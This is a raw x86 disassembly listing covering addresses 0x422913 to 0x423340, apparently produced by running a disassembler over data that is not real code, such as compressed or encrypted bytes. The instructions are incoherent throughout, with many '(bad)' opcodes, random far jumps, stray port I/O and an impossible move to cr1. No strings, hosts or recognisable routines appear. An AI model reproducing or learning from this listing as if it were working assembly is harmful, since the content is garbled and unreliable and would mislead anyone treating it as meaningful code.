  422913:	mov    bl,0xd0
  422915:	mov    al,0x56
  422917:	xchg   ecx,eax
  422918:	and    DWORD PTR [ebx],esp
  42291a:	rcr    BYTE PTR [ecx+0x29be867b],1
  422920:	push   ds
  422921:	mov    BYTE PTR [edi+0x3a716c75],dh
  422927:	cmp    bh,BYTE PTR [ebp+0x6]
  42292a:	mov    ds:0x36d6eb0,al
  42292f:	in     eax,dx
  422930:	js     0x422903
  422932:	scas   eax,DWORD PTR es:[edi]
  422933:	cli    
  422934:	mov    ah,ah
  422936:	xor    BYTE PTR [ecx+0x64503422],0x3c
  42293d:	cmp    al,0xb6
  42293f:	jecxz  0x4229a9
  422941:	mov    ds:0xb60a8b20,eax
  422946:	dec    esi
  422947:	xchg   ebp,eax
  422948:	inc    eax
  422949:	xor    ecx,ecx
  42294b:	fwait
  42294c:	xor    BYTE PTR [ebp+esi*4+0x56],dh
  422950:	xchg   esp,eax
  422951:	adc    ebx,DWORD PTR [esi]
  422953:	adc    BYTE PTR [edx],0x80
  422956:	stos   DWORD PTR es:[edi],eax
  422957:	cmp    eax,0xf344f25e
  42295c:	stos   DWORD PTR es:[edi],eax
  42295d:	mov    dl,dl
  42295f:	push   cs
  422960:	mov    esi,eax
  422962:	cmp    DWORD PTR [eax-0x33],ebx
  422965:	mov    DWORD PTR [eax+0x30f31f43],ebx
  42296b:	push   cs
  42296c:	push   esp
  42296d:	jp     0x422982
  42296f:	dec    ebp
  422970:	or     al,BYTE PTR [ebx]
  422972:	daa    
  422973:	(bad)  [eax-0x3f]
  422976:	(bad)  
  422977:	sbb    al,BYTE PTR [edi]
  422979:	pusha  
  42297a:	outs   dx,DWORD PTR ds:[esi]
  42297b:	dec    edi
  42297c:	or     DWORD PTR [edx-0x333643c7],ebp
  422982:	cmp    eax,0x1a290f61
  422987:	mov    edx,0x8dd66f09
  42298c:	dec    eax
  42298d:	pushf  
  42298e:	lds    ebx,FWORD PTR [esi-0x3d]
  422991:	ins    DWORD PTR es:[edi],dx
  422992:	jne    0x4229f3
  422994:	stc    
  422995:	test   al,0xe2
  422997:	or     BYTE PTR [ecx],0x63
  42299a:	nop
  42299b:	add    al,BYTE PTR [esi]
  42299d:	aad    0x8f
  42299f:	pop    ss
  4229a0:	es push 0xffffffb3
  4229a3:	pop    ds
  4229a4:	frstor [eax+0x70]
  4229a7:	push   cs
  4229a8:	pop    eax
  4229a9:	add    cl,BYTE PTR es:[di+0x581a]
  4229af:	ds call 0x99ab662f
	...
  422a15:	add    BYTE PTR [esi-0x377e796],dl
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x9aa8473
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [ebx],dh
  422a2f:	repnz cmp ecx,ecx
  422a32:	add    al,0x59
  422a34:	fidiv  DWORD PTR [edx]
  422a36:	xchg   esi,eax
  422a37:	pop    esp
  422a38:	and    bl,BYTE PTR [eax+ebp*8]
  422a3b:	jne    0x422a51
  422a3d:	mov    dl,0x11
  422a3f:	and    ch,BYTE PTR [ebp-0x707f9e72]
  422a45:	jo     0x422aa4
  422a47:	jae    0x422a25
  422a49:	es dec edx
  422a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a4c:	or     eax,0x313e6efa
  422a51:	mov    edx,DWORD PTR [ebp-0x1f]
  422a54:	jo     0x422a20
  422a56:	mov    edx,0x80e2e74
  422a5b:	push   esi
  422a5c:	pop    gs
  422a5e:	test   BYTE PTR [ebp+0x5f],ah
  422a61:	mov    ecx,0xfd9beb3
  422a66:	mul    BYTE PTR [eax+0x649594f3]
  422a6c:	cwde   
  422a6d:	int    0x7a
  422a6f:	sub    al,0xb8
  422a71:	xlat   BYTE PTR ds:[ebx]
  422a72:	fild   WORD PTR [eax+0x1adc8f91]
  422a78:	mov    al,ds:0xd75571a2
  422a7d:	mov    dh,0x70
  422a7f:	imul   esp,ebx,0x1e5dc62b
  422a85:	xor    bh,BYTE PTR cs:[eax]
  422a88:	sar    BYTE PTR [edx-0x17208572],0x8
  422a8f:	in     al,dx
  422a90:	test   al,0xbf
  422a92:	fiadd  DWORD PTR [edi-0x17]
  422a95:	lods   al,BYTE PTR ds:[esi]
  422a96:	jmp    0x1d20622e
  422a9b:	xor    eax,0x93039731
  422aa0:	out    0x61,eax
  422aa2:	xchg   edi,eax
  422aa3:	cmp    eax,0xba989714
  422aa8:	sub    DWORD PTR [edx],edx
  422aaa:	adc    eax,0xa2122f75
  422aaf:	cwde   
  422ab0:	stos   DWORD PTR es:[edi],eax
  422ab1:	bound  esp,QWORD PTR [ecx]
  422ab3:	and    DWORD PTR [ebx+0x60],esi
  422ab6:	sub    bh,BYTE PTR [eax-0x42]
  422ab9:	bound  edi,QWORD PTR [esi]
  422abb:	sti    
  422abc:	cmp    BYTE PTR [ecx-0x6a],ah
  422abf:	sti    
  422ac0:	out    dx,eax
  422ac1:	pop    es
  422ac2:	imul   edi,edi,0xffffffc4
  422ac5:	pushf  
  422ac6:	stos   DWORD PTR es:[edi],eax
  422ac7:	loope  0x422aad
  422ac9:	add    ebp,esp
  422acb:	sub    eax,0x78fab4df
  422ad0:	enter  0xcdd,0xc9
  422ad4:	adc    BYTE PTR [ecx-0x27128b2],0x9a
  422adb:	pushf  
  422adc:	dec    edx
  422add:	dec    ecx
  422ade:	imul   esp,DWORD PTR [ebx+0x2474dd8d],0xffffffe4
  422ae5:	mov    WORD PTR [ebx+0x405fba02],gs
  422aeb:	or     eax,0x859021ed
  422af0:	mul    BYTE PTR [edi]
  422af2:	aaa    
  422af3:	jne    0x422b24
  422af5:	or     BYTE PTR [ebp+0x2e3de8b1],dh
  422afb:	xchg   edi,eax
  422afc:	dec    esi
  422afd:	retf   
  422afe:	fdivp  st(6),st
  422b00:	in     al,dx
  422b01:	push   edi
  422b02:	sub    ch,BYTE PTR [edi+0x50fa59c8]
  422b08:	push   ebx
  422b09:	test   BYTE PTR [edx-0x20],dh
  422b0c:	dec    ebp
  422b0d:	push   esi
  422b0e:	rcl    BYTE PTR [eax+0x26e79fe8],1
  422b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b15:	(bad)  
  422b16:	aad    0x4a
  422b18:	repz rcl BYTE PTR [edx+0x392c2098],0x90
  422b20:	in     al,0xad
  422b22:	es test eax,0xe4623f76
  422b28:	out    0xa6,eax
  422b2a:	lods   eax,DWORD PTR ds:[esi]
  422b2b:	push   eax
  422b2c:	retf   
  422b2d:	outs   dx,WORD PTR ds:[esi]
  422b2f:	cmp    al,0x8a
  422b31:	shr    DWORD PTR [edx],1
  422b33:	xchg   BYTE PTR [eax+eax*1],dl
	...
  422b96:	inc    esp
  422b97:	aaa    
  422b98:	dec    edx
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x6c8e54e4]
  422ba5:	inc    esp
  422ba6:	aas    
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    cl,bh
  422baf:	in     ax,0x81
  422bb2:	jecxz  0x422be5
  422bb4:	sbb    BYTE PTR [edx+0x60],bl
  422bb7:	js     0x422b6b
  422bb9:	nop
  422bba:	dec    ebp
  422bbb:	fs sbb eax,0x5f73064c
  422bc1:	(bad)  [edx-0x5f7d3e7d]
  422bc7:	pop    es
  422bc8:	sar    ch,0xbd
  422bcb:	xor    DWORD PTR [ebp-0x6b],ebx
  422bce:	xchg   esi,eax
  422bcf:	out    dx,eax
  422bd0:	ss dec edi
  422bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bd3:	or     eax,0x1cd09cac
  422bd8:	or     dl,ah
  422bda:	adc    al,0xe0
  422bdc:	adc    BYTE PTR ds:0xa4fbf636,0x17
  422be3:	cmp    eax,0xde64871b
  422be8:	adc    al,0xf1
  422bea:	mov    dh,0xa
  422bec:	dec    ebp
  422bed:	push   edi
  422bee:	pop    ebp
  422bef:	fwait
  422bf0:	out    0x9e,al
  422bf2:	mov    WORD PTR [ebp+0x697d7aeb],ss
  422bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bf9:	fucom  st(2)
  422bfb:	xchg   BYTE PTR [esi+0x2e],al
  422bfe:	test   al,0xb1
  422c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c01:	imul   edx,DWORD PTR [edx+ebx*4-0xce2ee96],0xd18d4e41
  422c0c:	mov    al,0x0
  422c0e:	rcr    DWORD PTR [edi],cl
  422c10:	sub    esi,DWORD PTR [edi]
  422c12:	jmp    0x422c2f
  422c14:	sub    al,0xed
  422c16:	pop    edx
  422c17:	dec    edi
  422c18:	in     al,dx
  422c19:	adc    eax,0x84529a2e
  422c1e:	addr16 push edi
  422c20:	mov    esi,0x39f8892
  422c25:	and    BYTE PTR [esp+edi*4-0x1b8cf668],0x82
  422c2d:	xchg   edi,eax
  422c2e:	cld    
  422c2f:	leave  
  422c30:	mov    al,0xaa
  422c32:	out    dx,al
  422c33:	ss test al,0x5f
  422c36:	cmp    al,0x17
  422c38:	fwait
  422c39:	xor    al,BYTE PTR ds:0x801b4eb5
  422c3f:	aas    
  422c40:	xlat   BYTE PTR ds:[ebx]
  422c41:	iret   
  422c42:	mov    DWORD PTR [edx+0x62],ecx
  422c45:	mov    ebx,0xf27d183
  422c4a:	adc    eax,0x5101e669
  422c4f:	int    0xf2
  422c51:	inc    edx
  422c52:	push   esp
  422c53:	mov    ecx,0x406e0569
  422c58:	cwde   
  422c59:	cmp    al,0xff
  422c5b:	je     0x422bee
  422c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c5e:	push   edx
  422c5f:	mov    ds:0x80ba51cc,eax
  422c64:	fisub  DWORD PTR [ebp+0x29970367]
  422c6a:	sar    BYTE PTR [edi+edi*1+0x5],cl
  422c6e:	mov    BYTE PTR [ecx+0x5b],bl
  422c71:	or     BYTE PTR [edi+0x76e6dbb5],dl
  422c77:	mov    dh,0xe7
  422c79:	cmp    BYTE PTR [edx+0x1c],0x59
  422c7d:	sbb    ecx,edi
  422c7f:	daa    
  422c80:	sahf   
  422c81:	mov    edi,0x47cba8c2
  422c86:	or     al,0x9b
  422c88:	pop    eax
  422c89:	xchg   ebp,eax
  422c8a:	test   bl,dh
  422c8c:	push   0x42d6c626
  422c91:	sbb    BYTE PTR [eax],al
  422c93:	dec    esi
  422c94:	dec    ebp
  422c95:	push   ss
  422c96:	outs   dx,DWORD PTR ds:[esi]
  422c97:	out    dx,eax
  422c98:	cmp    BYTE PTR [eax-0x42],bh
  422c9b:	pop    ecx
  422c9c:	inc    esp
  422c9d:	sbb    DWORD PTR [esi-0x34],eax
  422ca0:	fnstsw WORD PTR [eax]
  422ca2:	cmp    dl,BYTE PTR [edx-0x3bab79ad]
  422ca8:	dec    ebx
  422ca9:	(bad)  
  422caa:	iret   
  422cab:	push   ecx
  422cac:	psubw  mm3,QWORD PTR [ebx-0xc6c4b7b]
  422cb3:	scas   eax,DWORD PTR es:[edi]
  422cb4:	add    al,BYTE PTR [eax]
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fistp  QWORD PTR [ebx]
  422d23:	(bad)  
  422d24:	outs   dx,BYTE PTR ds:[esi]
  422d25:	mov    eax,0x17246
  422d2a:	pop    es
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [ebp-0x9],ah
  422d30:	(bad)  
  422d32:	mov    ebp,0x15b0b497
  422d37:	mov    dh,0x30
  422d39:	pop    edx
  422d3a:	add    al,0xe4
  422d3c:	mov    eax,DWORD PTR [ebx-0x2]
  422d3f:	mov    esi,0xd1a61bfd
  422d44:	pop    es
  422d45:	push   0xffffff9a
  422d47:	sub    edi,DWORD PTR [ecx]
  422d49:	fisubr WORD PTR [edi+eax*1-0x6b25cd35]
  422d50:	mov    ebx,0x5421e80e
  422d55:	jo     0x422ce2
  422d57:	push   esp
  422d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d59:	(bad)  
  422d5a:	push   ebx
  422d5b:	mov    ds,eax
  422d5d:	fidiv  WORD PTR [ebx]
  422d5f:	fldenv [ebp-0x76b58959]
  422d65:	fdivr  QWORD PTR [ecx]
  422d67:	sar    esp,0xc3
  422d6a:	sub    DWORD PTR es:[esi+0x0],ebp
  422d6e:	stos   BYTE PTR es:[edi],al
  422d6f:	fld    QWORD PTR [edi+0x5a]
  422d72:	fsub   st(5),st
  422d74:	gs dec esi
  422d76:	inc    esp
  422d77:	mov    ch,0xdc
  422d79:	imul   eax
  422d7b:	outs   dx,BYTE PTR ds:[esi]
  422d7c:	jg     0x422d9b
  422d7e:	sub    DWORD PTR [edx],0xa508ff81
  422d84:	xchg   edx,eax
  422d85:	test   DWORD PTR [edi+0x3581331],0xd8af65b3
  422d8f:	gs pop edx
  422d91:	pushf  
  422d92:	(bad)  
  422d94:	(bad)  
  422d96:	shl    ebp,cl
  422d98:	and    edx,DWORD PTR [ebx+0x34]
  422d9b:	mov    dh,0xa9
  422d9d:	mov    edi,0x556ad8e0
  422da2:	mov    ds:0x73f5d1e4,al
  422da7:	or     BYTE PTR [esi],0xaa
  422daa:	leave  
  422dab:	fwait
  422dac:	pop    esi
  422dad:	mov    edi,0x66751062
  422db2:	cmp    al,0xe0
  422db4:	xchg   DWORD PTR [ebp+0x7c],edi
  422db7:	dec    ebp
  422db8:	mov    cl,0x50
  422dba:	pop    ecx
  422dbb:	dec    DWORD PTR [eax-0x26]
  422dbe:	stc    
  422dbf:	je     0x422dcb
  422dc1:	in     al,dx
  422dc2:	add    DWORD PTR [edx-0x17],0xd545d2f7
  422dc9:	(bad)  
  422dca:	std    
  422dcb:	gs mov bl,0x91
  422dce:	cmp    dl,BYTE PTR [esi+0x580481ad]
  422dd4:	adc    esi,DWORD PTR [ecx+0x4c]
  422dd7:	pop    ebx
  422dd8:	mov    edi,0x6d30b36d
  422ddd:	inc    esi
  422dde:	shl    DWORD PTR [edx],cl
  422de0:	mov    al,0x83
  422de2:	jg     0x422e1d
  422de4:	imul   esp,esp,0xffffffad
  422de7:	das    
  422de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de9:	std    
  422dea:	das    
  422deb:	mov    ebp,0x9371857
  422df0:	add    ecx,edi
  422df2:	pop    ds
  422df3:	jo     0x422d75
  422df5:	scas   al,BYTE PTR es:[edi]
  422df6:	cmp    bl,BYTE PTR [ecx+0x4685084c]
  422dfc:	cli    
  422dfd:	xchg   DWORD PTR [ebx-0x29],esi
  422e00:	dec    edx
  422e01:	scas   al,BYTE PTR es:[edi]
  422e02:	push   edi
  422e03:	lods   al,BYTE PTR ds:[esi]
  422e04:	outs   dx,BYTE PTR ds:[esi]
  422e05:	push   DWORD PTR [ecx+0x62]
  422e08:	loope  0x422e5d
  422e0a:	inc    edi
  422e0b:	and    eax,0x5763f3a4
  422e10:	ret    0xfd4c
  422e13:	pop    esi
  422e14:	pushf  
  422e15:	loope  0x422e46
  422e17:	xor    DWORD PTR [ecx-0x39],edi
  422e1a:	mov    dh,0x60
  422e1c:	je     0x422ddf
  422e1e:	imul   ebp,esi,0xffffffc6
  422e21:	hlt    
  422e22:	mov    dh,0x43
  422e24:	fsub   DWORD PTR [ecx+0x3b5a2b18]
  422e2a:	repnz imul esi,DWORD PTR [edx+eiz*2],0xdb24a11c
  422e32:	inc    ebp
  422e33:	cmp    edx,DWORD PTR ds:0x0
	...
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0x69eb33bf
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [edx+0x4d],ah
  422eb0:	add    al,0x1b
  422eb2:	fist   WORD PTR [edx+0x503fb2b3]
  422eb8:	cmp    ebp,ebx
  422eba:	call   0x7bd7:0x36327cd6
  422ec1:	pop    ss
  422ec2:	cmp    al,0x5b
  422ec4:	jb     0x422e79
  422ec6:	push   edi
  422ec7:	(bad)  
  422ec8:	les    ebx,FWORD PTR [ecx+edi*2+0x7]
  422ecc:	add    BYTE PTR [ebx+0x47],ch
  422ecf:	cwde   
  422ed0:	call   0x6efb8c85
  422ed5:	mov    al,0x59
  422ed7:	cwde   
  422ed8:	mov    cl,0xf2
  422eda:	repnz inc ecx
  422edc:	test   al,0x25
  422ede:	mov    esp,0xd4cb1005
  422ee3:	icebp  
  422ee4:	pop    ecx
  422ee5:	cmp    eax,0xa070e2a8
  422eea:	iret   
  422eeb:	(bad)  
  422eec:	sub    ch,BYTE PTR [eiz*8-0x3d500699]
  422ef3:	test   al,0x4d
  422ef5:	pusha  
  422ef6:	stc    
  422ef7:	ror    ch,1
  422ef9:	sbb    eax,0x66e5c2e1
  422efe:	retf   
  422eff:	dec    esp
  422f00:	stc    
  422f01:	sub    DWORD PTR ds:0x326646e2,0xb
  422f08:	out    0xe5,al
  422f0a:	stos   DWORD PTR es:[edi],eax
  422f0b:	dec    edi
  422f0c:	sbb    BYTE PTR [edi-0x2f3a9ab2],bh
  422f12:	pop    esp
  422f13:	cmp    esp,DWORD PTR [ebp+edi*8-0x7a4a469b]
  422f1a:	adc    DWORD PTR ds:0x8be1936a,edx
  422f20:	xchg   DWORD PTR [ebx+0x277fcd51],esp
  422f26:	inc    esp
  422f27:	or     eax,0x1587d4e4
  422f2c:	mov    ds:0x62cad448,al
  422f31:	pop    ecx
  422f32:	dec    edi
  422f33:	bound  ecx,QWORD PTR [edi+0x28]
  422f36:	jmp    0x4da4:0x80b9c175
  422f3d:	int3   
  422f3e:	jne    0x422ee9
  422f40:	test   eax,0x90375215
  422f45:	mov    edi,0x509a0f64
  422f4a:	lds    edx,FWORD PTR [esi]
  422f4c:	sub    al,0x67
  422f4e:	jmp    0x8c61:0x6c867a53
  422f55:	adc    DWORD PTR [edi-0x39f801d5],esi
  422f5b:	jbe    0x422eea
  422f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f5e:	xchg   BYTE PTR [eax-0x70bb24c3],ah
  422f64:	aam    0xfb
  422f66:	mov    esp,0x29d3851c
  422f6b:	inc    ebx
  422f6c:	cmc    
  422f6d:	stos   DWORD PTR es:[edi],eax
  422f6e:	cmp    eax,0x8f91e918
  422f73:	mov    edx,0x2905a20c
  422f78:	dec    esi
  422f79:	in     eax,dx
  422f7a:	ret    
  422f7b:	fwait
  422f7c:	out    0x78,eax
  422f7e:	mov    cl,0xbf
  422f80:	gs mov esp,0x4b43499c
  422f86:	sub    al,0xe5
  422f88:	lods   eax,DWORD PTR ds:[esi]
  422f89:	stos   BYTE PTR es:[edi],al
  422f8a:	sub    BYTE PTR [edx-0x2f],cl
  422f8d:	add    dl,BYTE PTR [ebp-0x58]
  422f90:	test   eax,0xd2747e44
  422f95:	or     ah,BYTE PTR [ecx]
  422f97:	pusha  
  422f98:	sub    cl,BYTE PTR [esi+0x59efaff9]
  422f9e:	adc    ch,BYTE PTR [edx-0x1664120]
  422fa4:	push   edi
  422fa5:	clc    
  422fa6:	inc    ebx
  422fa7:	lods   eax,DWORD PTR ds:[esi]
  422fa9:	into   
  422faa:	add    al,0xb4
  422fac:	pop    ss
  422fad:	pop    ds
  422fae:	mov    ch,bl
  422fb0:	out    dx,al
  422fb1:	push   edx
  422fb2:	loop   0x422f36
  422fb4:	mov    ch,0x0
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [edi-0x5f],esp
  423024:	mov    ebx,esp
  423026:	push   esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [eax+0x55],bl
  423030:	add    al,0xf
  423032:	mov    ah,0x6b
  423034:	data16 imul al
  423037:	add    ebp,DWORD PTR [ebx]
  423039:	adc    BYTE PTR [edx],ch
  42303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303c:	dec    esi
  42303d:	fiadd  WORD PTR [ecx+edi*1]
  423040:	in     eax,0x40
  423042:	jl     0x4230ae
  423044:	scas   al,BYTE PTR es:[edi]
  423045:	clc    
  423046:	loope  0x423057
  423048:	ret    
  423049:	sbb    eax,0x7f07aba7
  42304e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42304f:	hlt    
  423050:	(bad)  
  423051:	mov    ss,WORD PTR [edx]
  423053:	xor    BYTE PTR [ebx],ah
  423055:	(bad)  
  423056:	and    DWORD PTR [edx],edi
  423058:	pop    esp
  423059:	mov    ah,0xea
  42305b:	inc    eax
  42305c:	inc    edi
  42305d:	cld    
  42305e:	shl    BYTE PTR [eax+0x6c53752],cl
  423064:	jbe    0x423058
  423066:	mov    ecx,0xd6149f9c
  42306b:	mov    bl,0xb8
  42306d:	cmc    
  42306e:	sub    al,0xfc
  423070:	dec    edx
  423071:	mov    al,0xb1
  423073:	int    0x8d
  423075:	xor    eax,0x2c1ce0b
  42307a:	jmp    DWORD PTR [edi]
  42307c:	lahf   
  42307d:	jno    0x4230d6
  42307f:	stc    
  423080:	mov    eax,0x963cdc62
  423085:	lock pushf 
  423087:	(bad)  
  423088:	adc    al,0x3a
  42308a:	fnstenv [eax-0x64150ea8]
  423090:	xor    esp,DWORD PTR [ebp+0x937e2ef]
  423096:	dec    ebx
  423097:	inc    esp
  423098:	xchg   ebx,eax
  423099:	(bad)  
  42309a:	cld    
  42309b:	hlt    
  42309c:	mov    dl,0xa6
  42309e:	loop   0x423111
  4230a0:	xor    ebx,eax
  4230a2:	cmp    al,0x3f
  4230a4:	xor    eax,0xd14e140a
  4230a9:	test   DWORD PTR [edx+edi*2+0x38],edi
  4230ad:	in     al,dx
  4230ae:	dec    esp
  4230af:	push   cs
  4230b0:	jle    0x4230ea
  4230b2:	push   cs
  4230b3:	xchg   esp,eax
  4230b4:	clc    
  4230b5:	adc    edx,esp
  4230b7:	loop   0x423097
  4230b9:	test   eax,0xa7408ac6
  4230be:	shr    al,1
  4230c0:	or     al,0x92
  4230c2:	jmp    0x423091
  4230c4:	aad    0x4b
  4230c6:	int3   
  4230c7:	xor    DWORD PTR [edi-0x48],0xffffffc9
  4230cb:	aad    0x22
  4230cd:	fldenv [ebx+0x7a]
  4230d0:	jle    0x4230e2
  4230d2:	jne    0x42310a
  4230d4:	cwde   
  4230d5:	(bad)  
  4230d6:	icebp  
  4230d7:	repnz dec edi
  4230d9:	das    
  4230da:	clc    
  4230db:	fsub   DWORD PTR [esi+0x3bcd748b]
  4230e1:	inc    ecx
  4230e2:	scas   eax,DWORD PTR es:[edi]
  4230e3:	cmc    
  4230e4:	jmp    0x42312c
  4230e6:	scas   eax,DWORD PTR es:[edi]
  4230e7:	push   0xffffffaf
  4230e9:	fidiv  DWORD PTR [edi]
  4230eb:	mov    esi,edx
  4230ed:	jo     0x4230a2
  4230ef:	repnz loopne 0x423163
  4230f2:	or     ecx,DWORD PTR [ebx+0x2d]
  4230f5:	out    dx,eax
  4230f6:	jmp    0xc431:0x6671e168
  4230fd:	loope  0x423095
  4230ff:	sub    DWORD PTR [eax+0x50],esi
  423102:	aam    0x28
  423104:	jmp    0x4230ac
  423106:	and    al,0x23
  423108:	push   ecx
  423109:	xor    al,0xe4
  42310b:	jbe    0x4230b1
  42310d:	sub    DWORD PTR [eax+edi*2-0x7cfe8c14],eax
  423114:	out    dx,eax
  423115:	ss inc ebp
  423117:	out    0x6a,eax
  423119:	jne    0x4230c4
  42311b:	mov    eax,?
  42311d:	ficom  WORD PTR [esp+eiz*2+0xc6acdf2]
  423124:	sbb    esp,DWORD PTR [edx-0x27]
  423127:	shr    bl,1
  423129:	xchg   esp,eax
  42312a:	cdq    
  42312b:	jo     0x423101
  42312d:	jl     0x4230b3
  42312f:	test   BYTE PTR [esi-0x2fd3c7f2],ah
	...
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	and    BYTE PTR [esi],0xac
  4231a4:	adc    ah,BYTE PTR [esi+0x1755b]
  4231aa:	pop    es
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [edx+0x76],bl
  4231b0:	push   edx
  4231b1:	fucomp st(0)
  4231b3:	xchg   edi,eax
  4231b4:	pop    esi
  4231b5:	push   ebx
  4231b6:	mov    eax,0x24f999d6
  4231bb:	pushf  
  4231bc:	xchg   ebx,eax
  4231bd:	adc    ebx,DWORD PTR [ecx+esi*8-0x7553bc71]
  4231c4:	cmp    dl,BYTE PTR [ecx]
  4231c6:	adc    ch,ah
  4231c8:	cli    
  4231c9:	or     eax,0x6f67706a
  4231ce:	mov    ah,0x7
  4231d0:	and    DWORD PTR [ecx],edx
  4231d2:	scas   eax,DWORD PTR es:[edi]
  4231d3:	pop    ebx
  4231d4:	xor    dh,ah
  4231d6:	pop    es
  4231d7:	lea    edi,[ebx-0x2fa43a36]
  4231dd:	pop    esp
  4231de:	or     eax,0xfb53e704
  4231e3:	push   ds
  4231e4:	lds    edx,FWORD PTR [esi-0x642e8904]
  4231ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231eb:	das    
  4231ec:	sub    dl,BYTE PTR [eax-0x6e]
  4231ef:	push   es
  4231f0:	pop    ebx
  4231f1:	ins    BYTE PTR es:[edi],dx
  4231f2:	addr16 pop ebp
  4231f4:	xlat   BYTE PTR ds:[ebx]
  4231f5:	push   eax
  4231f6:	shl    BYTE PTR [esi+0x8ff2ee3],cl
  4231fc:	pop    ds
  4231fd:	out    dx,eax
  4231fe:	out    0x12,eax
  423200:	sub    ebp,ebx
  423202:	neg    edx
  423204:	ficom  WORD PTR [edx+ecx*1-0x1cd712c5]
  42320b:	data16 (bad) 
  42320d:	into   
  42320e:	pop    ss
  42320f:	mov    dh,0x27
  423211:	test   dh,bl
  423213:	push   ecx
  423214:	inc    ebx
  423215:	mov    cr1,ebx
  423218:	sub    eax,0x78dafd72
  42321d:	mov    ah,0x76
  42321f:	inc    DWORD PTR [ebx+0x785b08d]
  423225:	stos   BYTE PTR es:[edi],al
  423226:	pop    esp
  423227:	mov    dl,0x6a
  423229:	inc    ebp
  42322a:	push   ebp
  42322b:	cmp    al,BYTE PTR [edx]
  42322d:	inc    esi
  42322e:	cmp    dh,BYTE PTR [edi+0x45]
  423231:	icebp  
  423232:	fs popa 
  423234:	push   0xffffffd6
  423236:	mov    ebp,0xa30249d9
  42323b:	sahf   
  42323c:	dec    ebx
  42323d:	in     al,0x58
  42323f:	push   ecx
  423240:	pop    ecx
  423241:	mov    WORD PTR [edi],gs
  423243:	scas   al,BYTE PTR es:[edi]
  423244:	mov    ecx,0x14b80fa7
  423249:	(bad)  
  42324a:	adc    BYTE PTR [ecx],0xc4
  42324d:	in     eax,0xaf
  42324f:	or     al,0xaa
  423251:	xor    BYTE PTR [esi-0x65],dl
  423254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423255:	lods   al,BYTE PTR ds:[esi]
  423256:	adc    al,BYTE PTR [esi+edi*4-0x3b]
  42325a:	push   ecx
  42325b:	adc    ebp,DWORD PTR [ebx]
  42325d:	inc    esi
  42325e:	sub    BYTE PTR [eax-0x73f341a],0xe
  423265:	inc    ebp
  423266:	hlt    
  423267:	mov    esp,0x28794bdc
  42326c:	lods   al,BYTE PTR ds:[esi]
  42326d:	fimul  DWORD PTR [ebx]
  42326f:	ret    0x3df9
  423272:	cld    
  423273:	or     al,0x38
  423275:	iret   
  423276:	mov    dh,BYTE PTR [edx-0x5d65ecb2]
  42327c:	add    al,0x45
  42327e:	repz popa 
  423280:	xchg   esi,eax
  423281:	mov    BYTE PTR [edx-0x53534228],al
  423287:	or     eax,0xb994a629
  42328c:	loop   0x4232df
  42328e:	ret    
  42328f:	add    esi,ecx
  423291:	sti    
  423292:	pop    esp
  423293:	adc    dh,BYTE PTR [edx+0x79]
  423296:	outs   dx,BYTE PTR ds:[esi]
  423297:	(bad)  
  423298:	jecxz  0x423220
  42329a:	dec    edi
  42329b:	ds shl ch,cl
  42329e:	les    ebx,FWORD PTR [edx+0x4d]
  4232a1:	xchg   esp,eax
  4232a2:	xor    DWORD PTR [eax],ebx
  4232a4:	jp     0x423273
  4232a6:	icebp  
  4232a7:	imul   ecx,DWORD PTR [edx],0x1ef52566
  4232ad:	sub    al,0xf5
  4232af:	lods   al,BYTE PTR ds:[esi]
  4232b0:	mov    esp,0x16082927
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	and    esp,DWORD PTR [esi-0x80]
  423325:	xchg   esi,eax
  423326:	bound  esi,QWORD PTR [esi+0x1]
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [eax+0x38],ch
  423330:	popa   
  423331:	imul   DWORD PTR [ecx+0xcee5aa8]
  423337:	loopne 0x42336e
  423339:	mov    al,0xda
  42333b:	mov    eax,0xfac9b8b5
  423340:	mov    dl,0xa2
